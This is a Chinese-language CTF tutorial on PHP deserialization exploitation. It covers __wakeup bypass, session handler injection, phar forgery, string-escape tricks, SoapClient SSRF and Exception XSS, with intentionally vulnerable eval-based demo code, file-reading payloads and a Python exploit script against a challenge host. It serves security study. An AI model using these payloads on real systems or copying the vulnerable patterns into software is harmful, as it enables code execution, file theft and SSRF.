反序列化无论在CTF比赛中，抑或是实战渗透中都起着重要作用，而这一直都是我的弱项之一，所以写一篇反序列化利用总结来深入学习一下

<!-- more -->

## 简单介绍

 **（反）序列化只是给我们传递对象提供了一种简单的方法。**

`serialize()`将一个对象转换成一个字符串

`unserialize()`将字符串还原为一个对象

在本质上，反序列化的数据是没有危害的，但是当反序列化数据是用户可控时，这时就会产生一些预期外的结果，也就可能存在危害

 **因此，反序列化的危害，关键在于可控或不可控，而我们找反序列化漏洞时，数据的可控与不可控也是一处着力点**

在本文，不会着重讨论反序列化漏洞的形成原理，这已经被其他师傅讲得很透彻了，我在这里只是稍微总结一下思路，仅此而已

漏洞成因即利用思路

才疏学浅，若有错误，多加包涵

## Magic function

Magic function，即我们常说的魔术方法，我们的反序列化漏洞也常常与这些相挂钩

`__construct()`：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。

`__destruct()`：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。

`__wakeup()`：如前所提，unserialize()时会检查是否存在 `__wakeup()`，如果存在，则会优先调用
`__wakeup()`方法。

`__toString()`:用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。

`__sleep()`:用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。

## 利用方式

### __wakeup()

对应的CVE编号： **CVE-2016-7124**

存在的php版本： PHP5.6.25之前版本和7.0.10之前的7.x版本

漏洞成因：当对象的属性（变量）数大于实际的个数时，`__wakeup`可以被被绕过

#### demo

    
    
    <?php  
    highlight_file(__FILE__);  
    error_reporting(0);  
    class convent{  
    var $warn = "No hacker.";  
    function __destruct(){  
    eval($this->warn);  
    }  
    function __wakeup(){  
    foreach(get_object_vars($this) as $k => $v) {  
    $this->$k = null;  
    }  
    }  
    }  
    $cmd = $_POST[cmd];  
    unserialize($cmd);  
    ?>

这边的 `__wakeup`是事件型的，如果没遇到`unserialize`就永远不会触发了，所以我们得先搞清楚先执行哪个方法，再执行哪个方法。

在这里，经过测试，我们可以得出`__wakeup`优先级高于 `__destruct()`

因为遇到了`unserialize`得先执行 `__wakeup`里面的内容，才能跑到我们想要的 `__destruct()`里面，所以得绕过这个
`__wakeup`

怎么绕过？

只要对象的属性（变量）数大于实际的个数时，`__wakeup`就可以被被绕过

    
    
    <?php  
    ​  
    class convent{  
    var $warn = "phpinfo();";  
    function __destruct(){  
      
    }     
    }  
    $a = new convent();  
    $b = serialize($a);  
    print_r($b);//O:7:"convent":1:{s:4:"warn";s:10:"phpinfo();";}  
    ?>

然后更改变量数即可

    
    
    O:7:"convent":1:{s:4:"warn";s:10:"phpinfo();";} >> O:7:"convent":2:{s:4:"warn";s:10:"phpinfo();";}

![1.png](https://image.3001.net/images/20210729/1627537669_610241056aeded870fd54.png!small)

存在多个魔法方法时，要弄清哪个魔法方法的优先级高

### PHP session反序列化

这在我之前一篇[文章](https://mp.weixin.qq.com/s/EY5ZUA-FcjBdiSivCh1qpQ)其实已经介绍得差不多了

漏洞成因：其主要原理就是利用 **序列化的引擎和反序列化的引擎不一致时，引擎之间的差异产生序列化注入漏洞**

demo

在之前的高校战疫中考查过, 利用的就是php session的序列化机制差异导致的注入漏洞

相关题目: <http://web.jarvisoj.com:32784/>

    
    
    <?php  
    //A webshell is wait for you  
    ini_set('session.serialize_handler', 'php');  
    session_start();  
    class OowoO  
    {  
    public $mdzz;  
    function __construct()  
    {  
    $this->mdzz = 'phpinfo();';  
    }  
    ​  
    function __destruct()  
    {  
    eval($this->mdzz);  
    }  
    }  
    if(isset($_GET['phpinfo']))  
    {  
    $m = new OowoO();  
    }  
    else  
    {  
    highlight_string(file_get_contents('index.php'));  
    }  
    ?>

仔细看了一遍发现题目没有入口，注意到有`ini_set('session.serialize_handler',
'php')`存在，猜测是否为session反序列化漏洞

看一下phpinfo

![2.png](https://image.3001.net/images/20210729/1627537670_6102410637691131c23d1.png!small)

> local value(当前目录，会覆盖master value内容):phpmaster
> value(主目录，php.ini里面的内容):php_serialize

这就很明显存在session反序列化漏洞了

![3.png](https://image.3001.net/images/20210729/1627537670_61024106a98ac916305cd.png!small)

> 当一个上传在处理中，同时`POST`一个与`INI`中设置的`session.upload_progress.name` **同名**
> 变量时，当`PHP`检测到这种`POST`请求时，它会在`$_SESSION`中添加一组数据，索引是
> `session.upload_progress.prefix`与 `session.upload_progress.name`连接在一起的值。
>
> 所以可以通过`Session Upload Progress`来设置`session`

 **允许上传且结束后不清除数据，这样更有利于利用**

我们在html网页源码上加入以下代码

    
    
    <form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">  
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />  
    <input type="file" name="file" />  
    <input type="submit" />  
    </form>

![4.png](https://image.3001.net/images/20210729/1627537671_610241073b388569261ee.png!small)

接下来就是考虑怎么利用了，我们可以利用反序列化数据可控来达成我们的目的

    
    
    <?php  
    ini_set('session.serialize_handler', 'php_serialize');  
    session_start();  
    class OowoO  
    {  
    public $mdzz='print_r(scandir(dirname(__FILE__)));';  
    }  
    $obj = new OowoO();  
    echo serialize($obj);//O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}  
    ?>

![5.png](https://image.3001.net/images/20210729/1627537671_61024107d5d964bb213f1.png!small)

为了防止被转义，我们在双引号前加上反斜杠`\`

    
    
    |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}

抓包上传，将`filename`改成我们的payload（要`INI`中设置的`session.upload_progress.name`同名变量）

![6.png](https://image.3001.net/images/20210729/1627537672_6102410887d03f6ed6e7c.png!small)

这样我们就可以看到当前目录的文件了，再去phpinfo中查看当前目录

![7.png](https://image.3001.net/images/20210729/1627537673_6102410977da918cdb33f.png!small)

更改payload，利用`print_r`来读取目标文件

    
    
    |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}

![8.png](https://image.3001.net/images/20210729/1627537674_6102410a05f0afdd7ab17.png!small)

### phar 反序列化

`phar`在网上已经有很多解释了，这里就不过多赘述，简单来说`phar`就是`php`压缩文档，不经过解压就能被 `php`访问并执行

前提条件

>  
>
>  
>  
>     php.ini中设置为phar.readonly=Off  
>     > php version>=5.3.0
>
>  
>

漏洞成因：`phar`存储的`meta-data`信息以序列化方式存储，当 **文件操作函数**
（`file_exists()`、`is_dir()`等）通过`phar://`伪协议解析`phar`文件时就会将数据反序列化，并且可以不依赖`unserialize()`直接进行反序列化操作。

#### demo

根据文件结构我们来自己构建一个`phar`文件，`php`内置了一个`Phar`类来处理相关操作

    
    
    <?php  
    class User{  
    var $name;  
    function __destruct(){  
    echo "Blackwatch";  
    }  
    }  
    ​  
    @unlink("test.phar");  
    $phar = new Phar("test.phar");//后缀名必须为phar  
    $phar->startBuffering();  
    $phar->setStub("<?php __HALT_COMPILER(); ?>");//设置stub  
    $o = new User();  
    $o->name = "test";  
    $phar->setMetadata($o);//将自定义的meta-data存入manifest  
    $phar->addFromString("test.txt", "Blackwatch");//添加要压缩的文件  
    //签名自动计算  
    $phar->stopBuffering();  
    ?>

可以很明显看到我们的`manifest`（也就是`meta-data`）是以序列号形式存储的

![10.png](https://image.3001.net/images/20210729/1627537674_6102410af0346c45b1f6c.png!small)

在上面的demo中我们可以看到，当文件系统函数的参数可控时，我们可以在不调用`unserialize()`的情况下进行反序列化操作，其他函数也是可以的

> phar反序列化可以利用的函数
>
>
> ![9.png](https://image.3001.net/images/20210729/1627537675_6102410bcd2bd975de62d.png!small)

##### phar文件伪造

因为php对phar文件的识别是通过文件头`stub`来识别的，更准确的说是`__HALT_COMPILER();?>`这段代码，对于前面的内容和后缀名是没有要求的，我们可以利用这个特性将phar伪装成其他文件进行上传

phar 文件能够上传

文件操作函数参数可控, `:`,`/``phar`等特殊字符没有被过滤

有可用的魔术方法作为”跳板”

    
    
    $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");

例题：SWPUCTF2018 SimplePHP

##### bypass phar:// 不能出现在首部

这时我们我们可以利用`compress.zlib://`或`compress.bzip2://`函数,`compress.zlib://`和`compress.bzip2://`同样适用于`phar://`

payload

    
    
    compress.zlib://phar://phar.phar/test.txt

例题：巅峰极客 2020 babyphp2

### 字符逃逸

PHP 在反序列化时，底层代码是以 `;`作为字段的分隔，以 `}`作为结尾(字符串除外)，并且是根据长度判断内容的 .

当长度不对应的时候会出现报错

可以反序列化类中不存在的元素

漏洞成因：利用序列化后的数据经过过滤后出现字符变多或变少，导致字符串逃逸

#### 字符串变多

[0CTF 2016]piapiapia

扫描目录发现有`[WWW.ZIP](http://www.zip/)`泄露，下载后用Seay源码审计一下

![11.png](https://image.3001.net/images/20210729/1627537676_6102410cbcbe1aac70d29.png!small)

而我们对源码全局搜索时发现，只有config.php存在flag字段的内容，因此可以分析我们的初步思路

因为在profile.php 中: 存在文件操作函数`file_get_contents()`以及可控的参数
`photo`,如果`photo`为config.php 就能读取到flag

profile.php

![12.png](https://image.3001.net/images/20210729/1627537677_6102410d4323bda4f579f.png!small)

update.php

![13.png](https://image.3001.net/images/20210729/1627537678_6102410e20f215d75b436.png!small)

class.php

![14.png](https://image.3001.net/images/20210729/1627537679_6102410f2d595873323bc.png!small)

我们可以看到这里的正则过滤掉了where(5)替换成了hacker(6)

在update.php 中对数组profile 进行序列化储存后,在profile.php 进行反序列化

![15.png](https://image.3001.net/images/20210729/1627537680_6102411006420e2b7547f.png!small)

我们注册后来抓个包，发现数组中元素的传递nickname也是位于photo之前的，所以我们可以想办法让nickname足够长,把upload那部分字段给”挤出去”

这就是 **反序列化长度变化尾部字符串逃逸**

![16.png](https://image.3001.net/images/20210729/1627537681_610241111cc12828a6f61.png!small)

我们的目标是使photo字段的内容为config.php所以我们要的序列化数据闭合应为：`";}s:5:"photo";s:10:"config.php";}`，34个字符

我们的目的是将`";}s:5:"photo";s:10:"config.php";}`插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了

where(5)会替换成hacker(6)，长度加1，所以我们要构造34个where

> `";}`是为了闭合nickname部分，而后面这部分`s:5:"photo";s:10:"config.php";}`,就单独成为了 photo
> 的部分( **尾部字符串逃逸** ),到达效果

使用数组绕过nickname长度限制

    
    
    wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}

![17.png](https://image.3001.net/images/20210729/1627537681_61024111c40f133fdca6e.png!small)

发包后在`/profile.php`页面复制头像的地址,进行base64decode得到flag

#### 字符串变少

也有师傅称之为对象逃逸

俺没对象所以不用这个名称

原理与上者差不多，是经过序列化-->敏感字替换为空(长度变短)-->反序列化的过程之后再输出结果

直接看题

[安洵杯 2019]easy_serialize_php

源码如下

    
    
    <?php  
      
    $function = @$_GET['f'];  
      
    function filter($img){  
    $filter_arr = array('php','flag','php5','php4','fl1g');  
    $filter = '/'.implode('|',$filter_arr).'/i';  
    return preg_replace($filter,'',$img);  
    }  
      
      
    if($_SESSION){  
    unset($_SESSION);  
    }  
      
    $_SESSION["user"] = 'guest';  
    $_SESSION['function'] = $function;  
      
    extract($_POST);  
      
    if(!$function){  
    echo '<a href="index.php?f=highlight_file">source_code</a>';  
    }  
      
    if(!$_GET['img_path']){  
    $_SESSION['img'] = base64_encode('guest_img.png');  
    }else{  
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));  
    }  
      
    $serialize_info = filter(serialize($_SESSION));  
      
    if($function == 'highlight_file'){  
    highlight_file('index.php');  
    }else if($function == 'phpinfo'){  
    eval('phpinfo();'); //maybe you can find something in here!  
    }else if($function == 'show_image'){  
    $userinfo = unserialize($serialize_info);  
    echo file_get_contents(base64_decode($userinfo['img']));  
    }

根据提示我们可以在phpinfo中看到flag 在 `d0g3_f1ag.php`这个文件中，直接读取是不行的

`$_SESSION`数组中有 `user, funciton, img`这三个属性

img的值我们是控制不了的，进而无法读取到目标文件

我们把注意力转移到函数`serialize`上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，而这层过滤函数会干扰序列化后的数据

而且`extract($_POST)`存在变量覆盖漏洞

所以我们可以在这上面做文章

这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对

当我们令_SESSION[user]为flagflagflagflagflagflag时，正常情况下序列化后的数据是这样的：正常情况下，序列化后的数据应为

    
    
    a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}

但是因为过滤的原因，会变成这样

    
    
    a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}

可以看到，user的内容已经变为空，但是长度还是24，那么反序列化时就会自动往后读取24位，会读取到`";s:8:"function";s:59:"a`

`";s:8:"function";s:59:"a`其长度为24，作为一个整体成了user的值

因为php反序列化时，当一整段内容反序列化结束后，后面的非法字符将会被忽略，而我们可以看到这是以{作为序列化内容的起点，}作为序列化内容的终点

后面`";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}`这部分被舍弃

因此我们可以控制$userinfo["img"]的值，达到任意文件读取的效果

所以payload为

    
    
    _SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&function=show_image

读取完`d0g3_f1ag.php`后，得到下一个hint，获取到flag文件名

### Pop chain

严格来说，这更多像一种方法，就像玩乐高一样把一个个魔术方法串联起来，POP CHAIN
更多的是在类之间，方法之间的调用上，由于方法的参数可控存在危险函数，导致了漏洞,，实也是在代码逻辑上出现的问题

在编写Pop 链的exp的时候,，类的框架几乎不变，只需要做一些修改

pop chain的构造这里就不展开讨论了，毕竟这点位置来讲还不如去看一下github上师傅们挖出来的链实在，后面有机会可以写一下反序列化链构造的思路

### SoapClient

SoapClient 类搭配CRLF注入可以实现SSRF, 在本地生成payload的时候,需要修改`php.ini`中的 `;extension
soap`将注释删掉即可

漏洞成因：因为SoapClient 类会调用 `__call`方法,当执行一个不存在的方法时,被调用,从而实现ssrf

exp

    
    
    <?php  
    $a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));  
    $b = serialize($a);  
    echo $b;  
    $c = unserialize($b);  
    $c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf  
    ?>

LCTF 2018 bestphp's revenge

exp

    
    
    import requests  
    import re  
    url = "http://7c3ee1c8-bf16-4e25-bd02-db385135a819.node4.buuoj.cn/"  
    payload = '|O:10:"SoapClient":3:{s:3:"uri";s:3:"123";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:13:"_soap_version";i:1;}'  
    r = requests.session()  
    data = {'serialize_handler': 'php_serialize'}  
    res = r.post(url=url+'?f=session_start&name='+payload, data=data)  
    # print(res.text)  
    res = r.get(url)  
    # print(res.text)  
    data = {'b':'call_user_func'}  
    res = r.post(url=url+'?f=extract', data=data)  
    res = r.post(url=url+'?f=extract', data=data)  # 相当于刷新页面  
    sessionid = re.findall(r'string\(26\) "(.*?)"', res.text)  
    cookie = {"Cookie": "PHPSESSID=" + sessionid[0]}  
    res = r.get(url, headers=cookie)  
    print(res.text)

### Exception

与SoapClient一样，是属于PHP原生类

漏洞成因：php 的原生类中的`Error`和`Exception`中内置了`toString`方法, 可能造成xss漏洞

    
    
    <?php  
    $s = new Exception("<script>alert(1)</script>");  
    echo urlencode(serialize($s));  
    ?>

![18.png](https://image.3001.net/images/20210729/1627537682_6102411292cb424dd4c9e.png!small)

![19.png](https://image.3001.net/images/20210729/1627537683_6102411367f91302a248d.png!small)

## 总结

除了上面这些，还可以和sql注入，命令执行等结合，这里就不再一一赘述，php反序列化漏洞的利用，其实是与xss，sql注入等十分相似的，都是一种闭合-构造，以改变原本代码结构进而达到漏洞利用的目的的思路

